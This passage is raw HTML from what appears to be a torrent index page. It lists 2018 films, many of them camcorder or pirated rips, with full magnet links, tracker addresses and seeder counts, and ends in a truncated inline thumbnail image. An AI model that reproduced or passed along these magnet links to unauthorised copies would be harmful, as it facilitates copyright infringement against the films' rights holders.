<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="21/03/2018 14:07:31">3 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>1.68 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>4 830</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>3 539</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat300 icon16" href="/father-figures-2017-720p-brrip-x264-yify-t274024.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/father-figures-2017-720p-brrip-x264-yify-t274024.html" "><b>Father Figures (2017) 720p BrRip x264 - YIFY</b></a> <small><i>by <a href='/perfil/YIFY/'>YIFY</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/father-figures-2017-720p-brrip-x264-yify-t274024.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:394E2D7F94E3E10A5FFA582A1B2508A4E60AB64C&dn=Father Figures (2017) 720p BrRip x264 - YIFY&xl=1001351185&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr= udp://tracker.pirateparty.gr:6969/announce &tr=udp://eddie4.nl:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://p4p.arenabg.com:1337&tr=udp://9.rarbg.to:2710&tr= http://public.popcorn-tracker.org:6969/announce &tr= http://191.96.249.23:6969/announce &tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr= http://bt.xxx-tracker.com:2710/announce &tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://public.popcorn-tracker.org:6969&tr= http://tracker.uw0.xyz:6969/announce &tr= http://182.190.3.68:6969/announce &tr= http://tracker.skyts.cn:6969/announce &tr=http://tracker1.itzmx.com:8080/announce&tr=udp://asnet.pw:2710/announce&tr=udp://mgtracker.org:6969" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/father-figures-2017-720p-brrip-x264-yify-t274024/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="21/03/2018 14:07:15">3 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>954.96 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>1 696</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>1 348</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat300 icon16" href="/insidious-the-last-key-2018-720p-brrip-x264-yify-t272742.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/insidious-the-last-key-2018-720p-brrip-x264-yify-t272742.html" "><b>Insidious: The Last Key (2018) 720p BrRip x264 - YIFY</b></a> <small><i>by <a href='/perfil/YIFY/'>YIFY</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/insidious-the-last-key-2018-720p-brrip-x264-yify-t272742.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:E12937DFDBF497C2BFFAF8184FE19B4D4E3E5C6B&dn=Insidious: The Last Key (2018) 720p BrRip x264 - YIFY&xl=925114382&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://p4p.arenabg.com:1337&tr=http://tracker.mg64.net:6881/announce&tr=http://mgtracker.org:2710/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=http://open.acgtracker.com:1096/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/insidious-the-last-key-2018-720p-brrip-x264-yify-t272742/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 10:38:43">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>882.26 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2 974</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>975</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat300 icon16" href="/the-thousand-faces-of-dunjia-2017-720p-brrip-x264-yify-t271199.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/the-thousand-faces-of-dunjia-2017-720p-brrip-x264-yify-t271199.html" "><b>The Thousand Faces of Dunjia (2017) 720p BrRip x264 - YIFY</b></a> <small><i>by <a href='/perfil/YIFY/'>YIFY</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/the-thousand-faces-of-dunjia-2017-720p-brrip-x264-yify-t271199.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:0912EAAE6EAF842E04D90D0DCDFC6C845F690A66&dn=The Thousand Faces of Dunjia (2017) 720p BrRip x264 - YIFY&xl=1020740840&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://p4p.arenabg.com:1337&tr=udp://eddie4.nl:6969&tr=udp://9.rarbg.to:2710&tr=http://tracker.mg64.net:6881/announce&tr=http://mgtracker.org:2710/announce&tr=udp://public.popcorn-tracker.org:6969&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://tracker.files.fm:6969/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=http://open.acgtracker.com:1096/announce&tr=udp://asnet.pw:2710/announce&tr=udp://mgtracker.org:6969" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/the-thousand-faces-of-dunjia-2017-720p-brrip-x264-yify-t271199/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="18/03/2018 07:09:09">6 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>973.45 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>774</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>224</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat300 icon16" href="/tomb-raider-2018-new-720p-hd-ts-x264-hq-cpg-t272980.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/tomb-raider-2018-new-720p-hd-ts-x264-hq-cpg-t272980.html" "><b>Tomb Raider 2018 NEW 720p HD-TS X264 HQ-CPG</b></a> <small><i>by <a href='/perfil/makintos13/'>makintos13</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/tomb-raider-2018-new-720p-hd-ts-x264-hq-cpg-t272980.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:301F837BA68318BBAE60A5EA1583002C19891F15&dn=Tomb Raider 2018 NEW 720p HD-TS X264 HQ-CPG&xl=2860452016&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://tracker.coppersurfer.tk:6969&tr=http://tracker.mg64.net:6881/announce&tr=http://mgtracker.org:2710/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=http://open.acgtracker.com:1096/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/tomb-raider-2018-new-720p-hd-ts-x264-hq-cpg-t272980/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="20/03/2018 11:13:41">4 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>2.66 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>436</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>354</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat300 icon16" href="/i-kill-giants-2017-720p-brrip-x264-yify-t275243.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/i-kill-giants-2017-720p-brrip-x264-yify-t275243.html" "><b>I Kill Giants (2017) 720p BrRip x264 - YIFY</b></a> <small><i>by <a href='/perfil/YIFY/'>YIFY</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/i-kill-giants-2017-720p-brrip-x264-yify-t275243.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:17D3EF78ED8A4D27C268E102A8F37499D955FDC6&dn=I Kill Giants (2017) 720p BrRip x264 - YIFY&xl=962670332&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://bt.xxx-tracker.com:2710/announce &tr= http://tracker.uw0.xyz:6969/announce &tr= http://182.190.3.68:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/i-kill-giants-2017-720p-brrip-x264-yify-t275243/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="24/03/2018 05:09:03">17 hours</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>918.07 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>2 675</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>3 444</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat300 icon16" href="/pacific-rim-uprising-2018-hc-hdcam-akoam-t274152.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/pacific-rim-uprising-2018-hc-hdcam-akoam-t274152.html" "><b>Pacific Rim: Uprising 2018 HC HDCAM - AKOAM</b></a> <small><i>by <a href='/perfil/makintos13/'>makintos13</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/pacific-rim-uprising-2018-hc-hdcam-akoam-t274152.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:B576A698B5DDE4C9EE5208CB54E601BEBB99B2C4&dn=Pacific Rim: Uprising 2018 HC HDCAM - AKOAM&xl=1209395200&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://tracker.opentrackr.org:1337&tr= udp://tracker.pirateparty.gr:6969/announce &tr= http://191.96.249.23:6969/announce &tr= http://public.popcorn-tracker.org:6969/announce &tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr= http://bt.xxx-tracker.com:2710/announce &tr= http://tracker.uw0.xyz:6969/announce " title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/pacific-rim-uprising-2018-hc-hdcam-akoam-t274152/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="22/03/2018 00:35:48">2 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>1.13 GB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>583</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>339</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat300 icon16" href="/tomb-raider-2018-720p-hdcam-x264-aac-t271235.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/tomb-raider-2018-720p-hdcam-x264-aac-t271235.html" "><b>Tomb Raider 2018 720p HDCAM x264 AAC</b></a> <small><i>by <a href='/perfil/MovieFreak/'>MovieFreak</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/tomb-raider-2018-720p-hdcam-x264-aac-t271235.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:EB0DA9F0AEC5C93FBD8024812E07F914EBABFBFE&dn=Tomb Raider 2018 720p HDCAM x264 AAC&xl=921422483&tr=udp://public.popcorn-tracker.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://inferno.demonoid.pw:3391/announce&tr=udp://eddie4.nl:6969&tr=udp://tracker.opentrackr.org:1337&tr=udp://9.rarbg.to:2710&tr=udp://tracker.leechers-paradise.org:6969&tr=http://tracker.mg64.net:6881/announce&tr=http://mgtracker.org:2710/announce&tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://asnet.pw:2710/announce&tr=http://open.acgtracker.com:1096/announce&tr=http://tracker1.itzmx.com:8080/announce&tr=udp://mgtracker.org:6969" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/tomb-raider-2018-720p-hdcam-x264-aac-t271235/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="18/03/2018 07:40:56">6 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>878.74 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>87</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>74</font></b></td>
</tr>
<tr>
<td align=left style="text-align: left; width: 50%;"> <a class="cat300 icon16" href="/18-allure-2018-uncensored-movies-hdrip-x264-aac-sample-%E2%98%BBrdx%E2%98%BB-t271659.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/18-allure-2018-uncensored-movies-hdrip-x264-aac-sample-%E2%98%BBrdx%E2%98%BB-t271659.html" "><b>18+ Allure 2018 UNCENSORED Movies HDRip x264 AAC +Sample ☻rDX☻</b></a> <small><i>by <a href='/perfil/basicssom/'>basicssom</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/18-allure-2018-uncensored-movies-hdrip-x264-aac-sample-%E2%98%BBrdx%E2%98%BB-t271659.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:1369C590C1CCA90E725AE3D9D428732C3BCDE507&dn=18+ Allure 2018 UNCENSORED Movies HDRip x264 AAC +Sample ☻rDX☻&xl=739419762&tr=udp://eddie4.nl:6969&tr=udp://mgtracker.org:6969&tr=udp://public.popcorn-tracker.org:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=udp://9.rarbg.to:2710&tr=http://mgtracker.org:2710/announce&tr=http://tracker.mg64.net:6881/announce&tr=udp://tracker.opentrackr.org:1337&tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/18-allure-2018-uncensored-movies-hdrip-x264-aac-sample-%E2%98%BBrdx%E2%98%BB-t271659/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="18/03/2018 23:06:27">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>705.17 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>29</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>74</font></b></td>
</tr>
<tr class=impar>
<td align=left style="text-align: left; width: 50%;"> <a class="cat300 icon16" href="/demon-house-2018-movies-hdrip-x264-aac-with-sample-%E2%98%BBrdx%E2%98%BB-t271661.html"><span></span></a><a style="padding: 0px 0px 2px 10px;" href="/demon-house-2018-movies-hdrip-x264-aac-with-sample-%E2%98%BBrdx%E2%98%BB-t271661.html" "><b>Demon House 2018 Movies HDRip x264 AAC with Sample ☻rDX☻</b></a> <small><i>by <a href='/perfil/basicssom/'>basicssom</a></i></small><td style="text-align: right; width: 5%; white-space: nowrap;">
<a class="iverified icon16" href="/demon-house-2018-movies-hdrip-x264-aac-with-sample-%E2%98%BBrdx%E2%98%BB-t271661.html" title="torrent uploaded by a verified user">
<span></span>
</a>
<a class="imagnet icon16" href="magnet:?xt=urn:btih:E632AA5E3E81613F6D4877399FCBC4EF2D089BCC&dn=Demon House 2018 Movies HDRip x264 AAC with Sample ☻rDX☻&xl=739584117&tr=udp://eddie4.nl:6969&tr=udp://tracker.leechers-paradise.org:6969&tr=udp://tracker.coppersurfer.tk:6969&tr=http://tracker.mg64.net:6881/announce&tr=http://mgtracker.org:2710/announce&tr=udp://tracker.opentrackr.org:1337&tr=udp://mgtracker.org:6969&tr=udp://public.popcorn-tracker.org:6969&tr=udp://9.rarbg.to:2710&tr=http://announce.xxx-tracker.com:2710/announce&tr=udp://asnet.pw:2710/announce" title="download this torrent using magnet link">
<span></span>
</a>
<a class="idownload icon16" href="/demon-house-2018-movies-hdrip-x264-aac-with-sample-%E2%98%BBrdx%E2%98%BB-t271661/download" title="download this torrent">
<span></span>
</a>
</td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><span title="18/03/2018 23:06:35">5 days</span></td>
<td align="center" style="text-align: center; width: 70px;white-space: nowrap;"><font color=#004E98>705.32 MB</font></td><td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#59A018>19</font></a></b></td>
<td style="text-align: center; width: 70px;white-space: nowrap;"><b><font color=#B36C20>37</font></b></td>
</tr>
</table>
</td></tr></table><br /><br /><br /><table class="main" width=100% border=0 cellspacing=0 cellpadding=0><tr><td class="embedded"><h2><a href="/top/tv/">TV</a></h2><div id="div_tv" style="display:block;margin-left: 1px;"><div class="imdbInfo" style="height: 180px;overflow-x: auto;"><div class="dataList"><div class="card"><a href="/the-walking-dead-i1520211/" title="The Walking Dead"><img src='data:image/png;base64,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